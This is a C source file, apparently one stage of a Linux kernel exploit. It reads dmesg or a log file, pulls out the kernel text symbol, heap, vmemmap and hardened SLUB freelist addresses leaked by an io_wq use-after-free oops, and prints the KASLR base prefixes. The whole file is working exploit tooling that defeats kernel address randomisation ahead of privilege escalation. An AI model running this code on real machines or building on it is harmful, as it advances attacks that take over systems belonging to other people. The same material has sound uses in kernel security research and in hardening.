/*
 * iowq_leak_extract.c
 * Parses dmesg for the four KASLR bases leaked by the io_wq UAF oops:
 *   - RIP: <sym>+0x<off>            (text base)
 *   - ffff8... heap addresses       (linear map base)
 *   - fffff2... struct page *       (vmemmap base)
 *   - non-canonical address 0x...   (SLUB freelist hardened value)
 *
 * Reads dmesg by default, or a file passed as argv[1].
 *
 * gcc -O2 -o iowq_leak_extract iowq_leak_extract.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdint.h>

struct leak {
    char     text_sym[128];
    uint64_t text_off;
    uint64_t heap_obj, heap_lm_base;
    uint64_t vmemmap_obj, vmemmap_base;
    uint64_t fl[4];
    int      fl_cnt;
};

static uint64_t parse_hex(const char *s)
{
    uint64_t v = 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    while (isxdigit(*s)) {
        v <<= 4;
        char c = *s++;
        if (c >= '0' && c <= '9') v |= c - '0';
        else if (c >= 'a' && c <= 'f') v |= c - 'a' + 10;
        else v |= c - 'A' + 10;
    }
    return v;
}

static void scan_rip(const char *line, struct leak *l)
{
    const char *p = strstr(line, "RIP: ");
    if (!p || l->text_sym[0]) return;
    p = strchr(p, ':'); if (!p) return; p++;
    while (*p == ' ' || isdigit(*p) || *p == ':') p++;
    int n = 0;
    while (*p && *p != '+' && n < (int)sizeof(l->text_sym) - 1)
        l->text_sym[n++] = *p++;
    if (*p != '+') { l->text_sym[0] = 0; return; }
    l->text_off = parse_hex(p + 1);
}

static void scan_addrs(const char *line, struct leak *l)
{
    const char *p = line;
    while ((p = strstr(p, "ffff")) != NULL) {
        const char *q = p;
        while (isxdigit(*q)) q++;
        if (q - p == 16) {
            uint64_t v = parse_hex(p);
            uint64_t pref = v & 0xffff000000000000ULL;
            if (pref == 0xffff000000000000ULL) {
                uint64_t hi = v & 0xfffff00000000000ULL;
                if (hi >= 0xffff800000000000ULL && hi <= 0xffff8f0000000000ULL) {
                    if (!l->heap_obj) {
                        l->heap_obj = v;
                        l->heap_lm_base = v & 0xffffffff00000000ULL;
                    }
                } else if (hi >= 0xfffff00000000000ULL) {
                    if (!l->vmemmap_obj) {
                        l->vmemmap_obj = v;
                        l->vmemmap_base = v & 0xffffffff00000000ULL;
                    }
                }
            }
        }
        p = q;
    }
}

static void scan_hardened(const char *line, struct leak *l)
{
    const char *p = strstr(line, "non-canonical address");
    if (!p) return;
    p = strstr(p, "0x"); if (!p) return;
    if (l->fl_cnt < 4) l->fl[l->fl_cnt++] = parse_hex(p);
}

int main(int argc, char **argv)
{
    FILE *f;
    if (argc > 1) {
        f = strcmp(argv[1], "-") == 0 ? stdin : fopen(argv[1], "r");
        if (!f) { perror("fopen"); return 1; }
    } else {
        f = popen("dmesg 2>/dev/null", "r");
        if (!f) { perror("popen"); return 1; }
    }

    struct leak l = {0};
    char buf[4096];
    while (fgets(buf, sizeof buf, f)) {
        scan_rip(buf, &l);
        scan_addrs(buf, &l);
        scan_hardened(buf, &l);
    }

    if (l.text_sym[0])
        printf("text symbol:       %s+0x%lx\n", l.text_sym, l.text_off);
    if (l.heap_obj) {
        printf("heap object:       0x%016lx\n", l.heap_obj);
        printf("linear-map prefix: 0x%016lx\n", l.heap_lm_base);
    }
    if (l.vmemmap_obj) {
        printf("vmemmap object:    0x%016lx\n", l.vmemmap_obj);
        printf("vmemmap prefix:    0x%016lx\n", l.vmemmap_base);
    }
    for (int i = 0; i < l.fl_cnt; i++)
        printf("freelist[%d]:       0x%016lx\n", i, l.fl[i]);
    if (!l.text_sym[0] && !l.heap_obj && !l.vmemmap_obj && !l.fl_cnt)
        fprintf(stderr, "no leak found in dmesg\n");
    return 0;
}
